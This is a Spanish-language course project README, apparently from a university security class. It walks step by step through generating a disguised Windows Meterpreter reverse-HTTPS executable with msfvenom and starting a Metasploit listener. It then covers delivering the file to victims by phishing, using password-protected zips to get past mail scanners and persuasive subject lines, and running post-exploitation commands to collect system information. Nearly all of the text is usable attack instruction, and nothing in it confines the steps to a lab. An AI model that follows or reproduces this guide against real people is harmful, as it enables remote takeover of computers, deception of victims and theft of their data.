# Proyecto Grupo 4 - Generacion de Payload con Evasion de Antivirus

Este proyecto demuestra como generar un archivo malicioso usando Metasploit, enviarlo a una victima mediante tecnicas de ingenieria social, y obtener informacion del sistema comprometido. Todo el trabajo se realiza desde Kali Linux.

---

## Requisitos

Tener Kali Linux instalado. Si usas la configuracion del grupo, abre el archivo KaliLinux.exe que lanza Kali en pantalla completa automaticamente.

Dentro de Kali, instalar Metasploit si no viene incluido:

```
sudo apt-get update
sudo apt-get install metasploit-framework
```

---

## Paso 1 - Conocer tu IP

Antes de generar el payload necesitas saber cual es tu IP en la red. Ejecuta este comando en la terminal de Kali:

```
ip a
```

Busca la interfaz que dice eth0 o similar y anota el numero que aparece despues de inet. Ese numero es tu LHOST, la direccion a la que se va a conectar la victima cuando abra el archivo.

Si la victima esta fuera de tu red local, necesitas tu IP publica. La puedes ver con:

```
curl ifconfig.me
```

---

## Paso 2 - Generar el payload

Ejecuta el script incluido en el repositorio. El script te va a preguntar tu IP y genera el archivo automaticamente:

```
bash generar_payload.sh
```

Si prefieres correr el comando manualmente, es este:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o actualizacion_sistema.exe
```

Explicacion de cada parte del comando:

`msfvenom` es la herramienta de Metasploit que crea los payloads.

`-p windows/x64/meterpreter/reverse_https` define el tipo de conexion. Reverse significa que la victima llama a tu computadora, no al reves. HTTPS hace que el trafico parezca navegacion web normal, por eso los antivirus no lo bloquean de inmediato.

`LHOST` es tu IP, la direccion a la que se conecta la victima.

`LPORT 443` es el puerto. El 443 es el puerto estandar de HTTPS, ningun firewall lo bloquea porque es el mismo que usa cualquier pagina web.

`-f exe` le dice a msfvenom que el archivo final sea un ejecutable de Windows.

`-o actualizacion_sistema.exe` es el nombre del archivo que se genera.

---

## Paso 3 - Configurar el listener

El listener es el proceso que queda escuchando en tu computadora esperando que la victima abra el archivo. Tienes dos formas de iniciarlo.

Forma automatica con el script incluido:

```
msfconsole -r listener.rc
```

Forma manual escribiendo cada comando dentro de msfconsole:

```
msfconsole
```

Una vez que carga, escribe estos comandos uno por uno:

```
use exploit/multi/handler
```

Esto selecciona el modulo que recibe conexiones entrantes.

```
set payload windows/x64/meterpreter/reverse_https
```

Define que tipo de conexion vas a recibir. Tiene que coincidir exactamente con lo que pusiste al generar el payload.

```
set LHOST 0.0.0.0
```

El 0.0.0.0 significa que acepta conexiones en cualquier interfaz de red de tu maquina.

```
set LPORT 443
```

El mismo puerto que usaste al generar el payload.

```
set ExitOnSession false
```

Esto hace que el listener siga activo despues de recibir una conexion, util si hay mas de una victima en la demo.

```
run
```

Inicia el listener. A partir de este momento tu computadora esta esperando la conexion.

---

## Paso 4 - Enviar el archivo a la victima

El archivo generado tiene que llegar a la victima de forma convincente para que lo ejecute.

Por correo electronico: comprime el archivo en un zip con contrasena para que el escaner del servidor de correo no lo analice. En el cuerpo del correo pones la contrasena. El asunto puede ser algo como "Actualizacion pendiente del sistema" o "Documento del proyecto compartido".

```
zip -e actualizacion_protegida.zip actualizacion_sistema.exe
```

Por red social o mensajeria: sube el archivo a Google Drive y comparte el link. Google Drive no escanea el contenido de ejecutables, solo documentos de Office y PDFs.

---

## Paso 5 - Obtener la informacion del sistema

Cuando la victima ejecuta el archivo, en tu terminal aparece este mensaje:

```
[*] Meterpreter session 1 opened
```

Eso significa que tienes acceso. Ahora ejecutas los comandos para obtener la informacion que pide el proyecto.

Informacion general del sistema:

```
sysinfo
```

Este comando muestra el nombre del equipo, el sistema operativo con su version, la arquitectura del procesador y el idioma del sistema.

Nombre del usuario actual y su SID:

```
getuid
```

Muestra quien esta usando la computadora en ese momento. El SID es el identificador unico del usuario dentro del sistema Windows.

Para obtener el SID completo:

```
run post/windows/gather/enum_system
```

Este modulo recopila toda la informacion del sistema de una vez, incluyendo el SID, los usuarios del equipo, los grupos y la configuracion de red.

Listado del directorio actual:

```
shell
dir
```

Con shell abres una terminal de Windows dentro de la sesion. Con dir ves los archivos y carpetas del directorio donde esta parado el usuario en ese momento.

---

## Estructura del repositorio

```
grupo4-seguridad/
    README.md                 explicacion completa del proyecto
    generar_payload.sh        script que genera el payload pidiendo la IP
    listener.rc               script que configura el handler automaticamente
    capturas/                 carpeta donde van las screenshots para el reporte
```

---

## Informacion del grupo

Proyecto de la materia de Seguridad Informatica.

Integrantes: Cossio Brenda, Lopez Quezada Lisman, Guerra Acosta Cristian.

Tarea asignada: Generar un archivo malicioso que sera enviado a la victima via correo electronico o red social. El archivo debe ser confeccionado de forma que sea creible e invite a la victima a ejecutarlo. La informacion minima a obtener del equipo victima es la siguiente: informacion del sistema, SID, nombre del usuario actual y listado del directorio actual.
